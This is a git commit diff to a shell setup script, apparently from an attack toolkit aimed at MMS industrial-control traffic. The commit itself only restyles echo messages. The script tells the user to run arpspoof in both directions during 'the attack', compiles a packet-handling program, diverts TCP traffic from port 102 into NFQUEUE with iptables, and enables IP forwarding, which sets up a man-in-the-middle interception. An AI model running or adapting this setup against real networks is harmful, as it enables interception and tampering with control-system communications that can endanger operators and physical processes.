8534260464a82b0e3e272e1750b042fc0698d257
perra22 <lperracchio21@gmail.com>
2020-04-15 04:18:46 -0400

    beautified output

--- mms/nfqueue/setup.sh
+++ mms/nfqueue/setup.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
-echo "BE CAREFUL: this script is intended to run while arpspoofing is in progress!"
-echo "If it isn't run in two different terminal:"
-echo "TERMINAL 1: arpspoof ip1 ip2"
-echo "TERMINAL 2: arpspoof ip2 ip1"
-echo "KEEP THOSE TERMINALS OPEN DURING THE ATTACK"
+echo "[+] BE CAREFUL: this script is intended to run while arpspoofing is in progress!"
+echo "[+] If it isn't run in two different terminal:"
+echo "[+] TERMINAL 1: arpspoof ip1 ip2"
+echo "[+] TERMINAL 2: arpspoof ip2 ip1"
+echo "[+] KEEP THOSE TERMINALS OPEN DURING THE ATTACK"
 g++ -o mms_nfq mms_nfq.cpp -lnetfilter_queue
 iptables -t mangle -A POSTROUTING -p tcp --sport 102 -j NFQUEUE
 sysctl -w net.ipv4.ip_forward=1
